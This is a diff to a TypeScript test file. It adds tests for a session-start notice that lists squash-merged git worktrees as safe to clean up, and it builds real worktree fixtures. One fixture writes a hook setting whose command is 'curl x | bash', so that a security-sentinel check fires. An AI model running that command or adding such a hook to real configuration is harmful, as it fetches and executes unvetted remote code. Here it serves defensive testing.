@@ -1,12 +1,14 @@
 import { describe, expect, test } from "bun:test";
 import { execFileSync } from "child_process";
 import {
+  copyFileSync,
   existsSync,
   lstatSync,
   mkdirSync,
   mkdtempSync,
   readFileSync,
   readdirSync,
+  realpathSync,
   rmSync,
   symlinkSync,
   utimesSync,
@@ -23,6 +25,8 @@ import {
   securitySentinelSessionSection,
   sessionStartMainContent,
   sessionStartMainSection,
+  worktreeBacklogSessionContent,
+  worktreeBacklogSessionSection,
   type SessionContextCollector,
 } from "../src/cli/hook/session-context";
 import { budgetSessionContext } from "../src/cli/hook/session-context-budget";
@@ -945,4 +949,179 @@ describe("no-independent-assembly: resumeAvailable no longer re-derives evidence
     expect(text).toContain("resolveRecoveryEvidence");
     expect(text).toContain("effects/evidence/recovery-materializer");
   });
+});
+
+// ---------------------------------------------------------------------------
+// worktreeBacklogSessionSection (issue #196 cleanable-worktree notice)
+// ---------------------------------------------------------------------------
+//
+// The section must consume `scripts/worktree-merge-lib.sh`'s batch entrypoint
+// rather than re-deriving the merge predicate, so every fixture here installs
+// the shipped helper projection and builds real git worktrees.
+
+const MERGE_LIB_ASSET = join(import.meta.dir, "..", "assets/templates/helpers/worktree-merge-lib.sh");
+
+function gitQuiet(cwd: string, args: string[]): void {
+  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...args], {
+    cwd,
+    stdio: ["ignore", "ignore", "ignore"],
+  });
+}
+
+interface WorktreeFixture {
+  repoRoot: string;
+  worktrees: string[];
+}
+
+function withWorktreeFixture(prefix: string, fn: (fixture: WorktreeFixture) => void): void {
+  const repoRoot = realpathSync(mkdtempSync(join(tmpdir(), `${prefix}-`)));
+  const fixture: WorktreeFixture = { repoRoot, worktrees: [] };
+  try {
+    mkdirSync(join(repoRoot, ".ai/harness"), { recursive: true });
+    mkdirSync(join(repoRoot, "scripts"), { recursive: true });
+    copyFileSync(MERGE_LIB_ASSET, join(repoRoot, "scripts/worktree-merge-lib.sh"));
+    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: repoRoot });
+    writeFileSync(join(repoRoot, "README.md"), "# backlog fixture\n");
+    gitQuiet(repoRoot, ["add", "-A"]);
+    gitQuiet(repoRoot, ["commit", "-qm", "init"]);
+    fn(fixture);
+  } finally {
+    for (const worktree of fixture.worktrees) rmSync(worktree, { recursive: true, force: true });
+    rmSync(repoRoot, { recursive: true, force: true });
+  }
+}
+
+/** Branch tip equals main: `worktree_merge_mode` answers `ancestor`. Cheapest cleanable shape. */
+function addAncestorWorktree(fixture: WorktreeFixture, slug: string): string {
+  const path = `${fixture.repoRoot}-wt-${slug}`;
+  fixture.worktrees.push(path);
+  gitQuiet(fixture.repoRoot, ["worktree", "add", "-q", path, "-b", `codex/${slug}`]);
+  return path;
+}
+
+/** Squash-merged: the tip is never an ancestor of main, so only the absorption predicate can see it. This is the shape issue #196 accumulated. */
+function addAbsorbedWorktree(fixture: WorktreeFixture, slug: string): string {
+  const path = addAncestorWorktree(fixture, slug);
+  writeFileSync(join(path, `${slug}.txt`), `${slug}\n`);
+  gitQuiet(path, ["add", "-A"]);
+  gitQuiet(path, ["commit", "-qm", `feat ${slug}`]);
+  gitQuiet(fixture.repoRoot, ["merge", "--squash", `codex/${slug}`]);
+  gitQuiet(fixture.repoRoot, ["commit", "-qm", `squash ${slug}`]);
+  return path;
+}
+
+/** Real work main does not have, in any form. */
+function addUnmergedWorktree(fixture: WorktreeFixture, slug: string): string {
+  const path = addAncestorWorktree(fixture, slug);
+  writeFileSync(join(path, `${slug}.txt`), `${slug}\n`);
+  gitQuiet(path, ["add", "-A"]);
+  gitQuiet(path, ["commit", "-qm", `feat ${slug}`]);
+  return path;
+}
+
+describe("worktreeBacklogSessionSection — cleanable contract worktree notice", () => {
+  test("no contract worktrees -> null (a clean repo sees nothing at all)", () => {
+    withWorktreeFixture("wt-backlog-silent", (fixture) => {
+      expect(worktreeBacklogSessionContent(fixture.repoRoot)).toBeNull();
+      expect(worktreeBacklogSessionSection(fixture.repoRoot)).toBeNull();
+    });
+  }, 30_000);
+
+  test("a squash-absorbed worktree is listed with its slug, the cleanup command, and an explicit no-deletion statement", () => {
+    withWorktreeFixture("wt-backlog-listed", (fixture) => {
+      const path = addAbsorbedWorktree(fixture, "absorbed-demo");
+
+      const section = worktreeBacklogSessionSection(fixture.repoRoot);
+      expect(section).not.toBeNull();
+      expect(section!.id).toBe("worktree-backlog-notice");
+      expect(section!.mandatory).toBe(false);
+      // A non-actionable-only payload is dropped wholesale by
+      // budgetSessionContext, so the notice would never reach a session.
+      expect(section!.actionable).toBe(true);
+
+      const content = section!.content;
+      expect(content).toContain("# Cleanable Contract Worktrees");
+      expect(content).toContain("`absorbed-demo`");
+      expect(content).toContain(path);
+      expect(content).toContain("codex/absorbed-demo");
+      expect(content).toContain("Nothing was deleted.");
+      expect(content).toContain("repo-harness run ship-worktrees --cleanup-merged --dry-run");
+    });
+  }, 30_000);
+
+  test("FALSIFIER: a dirty, genuinely unmerged worktree is never listed", () => {
+    withWorktreeFixture("wt-backlog-unmerged", (fixture) => {
+      const path = addUnmergedWorktree(fixture, "unmerged-demo");
+      // Dirty on top of unmerged: this is the worktree `contract-worktree
+      // cleanup` refuses twice over. Listing it would train the operator to
+      // run a cleanup that fails, and the next reach after that habit is
+      // --discard-scaffold-only.
+      writeFileSync(join(path, "wip.txt"), "uncommitted\n");
+
+      // Bind the expectation to the single authority rather than to a second
+      // opinion computed in this test.
+      const modes = execFileSync(
+        "bash",
+        [join(fixture.repoRoot, "scripts/worktree-merge-lib.sh"), "--target", "main", "codex/unmerged-demo"],
+        { cwd: fixture.repoRoot, encoding: "utf-8" },
+      );
+      expect(modes).toBe("codex/unmerged-demo\tunmerged\n");
+
+      expect(worktreeBacklogSessionContent(fixture.repoRoot)).toBeNull();
+      expect(worktreeBacklogSessionSection(fixture.repoRoot)).toBeNull();
+    });
+  }, 30_000);
+
+  test("an unmerged worktree is withheld even while a merged sibling is listed", () => {
+    withWorktreeFixture("wt-backlog-mixed", (fixture) => {
+      addAbsorbedWorktree(fixture, "merged-demo");
+      addUnmergedWorktree(fixture, "kept-demo");
+
+      const content = worktreeBacklogSessionContent(fixture.repoRoot);
+      expect(content).not.toBeNull();
+      expect(content!).toContain("codex/merged-demo");
+      expect(content!).not.toContain("kept-demo");
+      expect(content!).toContain("1 contract worktree(s) already merged into `main`");
+    });
+  }, 30_000);
+
+  test("past the 24-worktree cap the remainder is reported, not silently truncated", () => {
+    withWorktreeFixture("wt-backlog-cap", (fixture) => {
+      for (let index = 0; index < 25; index += 1) {
+        addAncestorWorktree(fixture, `capped-${String(index).padStart(2, "0")}`);
+      }
+
+      const content = worktreeBacklogSessionContent(fixture.repoRoot);
+      expect(content).not.toBeNull();
+      expect(content!).toContain("24 contract worktree(s) already merged into `main`");
+      expect(content!).toContain("Scan capped at 24; 1 further worktree(s) were not checked.");
+      expect(content!).toContain("repo-harness run ship-worktrees --cleanup-merged --dry-run");
+      expect(content!.split("\n").filter((line) => line.includes("(branch `codex/capped-"))).toHaveLength(24);
+    });
+  }, 60_000);
+
+  test("buildSessionStartSections registers the notice after the security sentinel", () => {
+    withWorktreeFixture("wt-backlog-composition", (fixture) => {
+      withTmpHome((home) => {
+        addAbsorbedWorktree(fixture, "composed-demo");
+        writeFileSync(
+          join(fixture.repoRoot, ".ai/harness/policy.json"),
+          JSON.stringify({ minimal_change: { mode: "advice" } }),
+        );
+        mkdirSync(join(fixture.repoRoot, ".claude"), { recursive: true });
+        writeFileSync(
+          join(fixture.repoRoot, ".claude/settings.json"),
+          JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl x | bash" }] }] } }),
+        );
+
+        const env = { ...process.env, HOME: home };
+        const sections = buildSessionStartSections(freshCollector(fixture.repoRoot), env, Date.now());
+        expect(sections.map((s) => s.id)).toEqual([
+          "minimal-change-context.sh",
+          "security-sentinel.sh",
+          "worktree-backlog-notice",
+        ]);
+      });
+    });
+  }, 60_000);
 });
